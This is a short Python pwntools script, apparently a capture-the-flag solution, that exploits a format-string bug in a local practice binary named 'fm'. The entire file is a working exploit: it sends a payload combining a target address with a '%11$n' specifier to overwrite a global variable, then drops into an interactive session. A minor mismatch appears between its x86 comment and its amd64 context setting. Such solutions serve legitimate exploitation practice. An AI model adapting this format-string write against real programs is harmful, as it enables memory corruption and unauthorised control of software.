#Made by fly_autumn
#x86 format
from pwn import *
p = process("./fm")
elf = ELF("./fm")
context(os="linux",arch="amd64")

x_addr = 0x804a02c
payload = p32(x_addr) + b"%11$n"
p.sendline(payload)


p.interactive()
